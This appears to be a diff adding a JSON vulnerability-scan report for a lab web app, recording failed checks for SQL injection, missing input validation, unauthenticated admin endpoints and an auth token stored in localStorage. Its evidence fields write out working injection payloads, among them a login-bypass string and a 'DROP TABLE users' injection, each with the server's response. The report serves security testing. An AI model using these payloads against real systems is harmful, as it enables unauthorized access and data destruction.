@@ -1,0 +1,42 @@
+[
+  {
+    "vuln_id": "V1",
+    "title": "SQL Injection \u2014 login endpoint",
+    "cwe": "CWE-89",
+    "severity": "CRITICAL",
+    "evidence": "POST /api/login  payload={\"username\": \"' OR '1'='1' -- \", \"password\": \"anything\"}\n  \u2192 HTTP 200  body={\n  \"role\": \"admin\",\n  \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3ODA1NTUxMjB9.hhfP1KGYEtXrupCCIQfiqgnPuuvu0azYQH9FG0oyDbM\"\n}\n",
+    "passed": false
+  },
+  {
+    "vuln_id": "V2",
+    "title": "Missing Input Validation \u2014 /api/user?id=",
+    "cwe": "CWE-20",
+    "severity": "HIGH",
+    "evidence": "GET /api/user?id=<payload>\n  payload='abc'  \u2192 500  <!doctype html>\n<html lang=en>\n  <head>\n    <title>sqlite3.OperationalError: no such column: abc\n //\n  payload='1 OR 1=1'  \u2192 200  {\n  \"email\": \"alice@lab.local\",\n  \"id\": 1,\n  \"username\": \"alice\"\n}\n\n  payload='1; DROP TABLE users --'  \u2192 500  <!doctype html>\n<html lang=en>\n  <head>\n    <title>sqlite3.ProgrammingError: You can only execute on",
+    "passed": false
+  },
+  {
+    "vuln_id": "V4",
+    "title": "Broken Access Control \u2014 /api/admin/users (no auth)",
+    "cwe": "CWE-602 / CWE-285",
+    "severity": "CRITICAL",
+    "evidence": "GET /api/admin/users  (no Authorization header)\n  \u2192 HTTP 200  body={\n  \"users\": [\n    {\n      \"email\": \"alice@lab.local\",\n      \"id\": 1,\n      \"role\": \"admin\",\n      \"username\": \"alice\"\n    },\n    {\n      \"email\": \"bob@lab.local\",\n      \"id\": 2,\n      \"role\": \"user\",\n      \"username\": \"bob\"\n    },\n    {\n      \"email\": \"carol@lab.local\",\n      \"id\": 3,\n      \"role\":",
+    "passed": false
+  },
+  {
+    "vuln_id": "V4b",
+    "title": "Broken Access Control \u2014 DELETE /api/admin/delete/:id (no auth)",
+    "cwe": "CWE-285",
+    "severity": "CRITICAL",
+    "evidence": "DELETE /api/admin/delete/9999  (no Authorization header)\n  \u2192 HTTP 200  body={\n  \"message\": \"User 9999 deleted\"\n}\n",
+    "passed": false
+  },
+  {
+    "vuln_id": "V3",
+    "title": "Sensitive Data in localStorage \u2014 auth token",
+    "cwe": "CWE-922 / CWE-312",
+    "severity": "HIGH",
+    "evidence": "app/frontend/index.html line ~71:\n  localStorage.setItem('auth_token', data.token);\n\n  DAST cannot observe browser storage automatically.\n  Detected by SAST / manual code review.",
+    "passed": false
+  }
+]
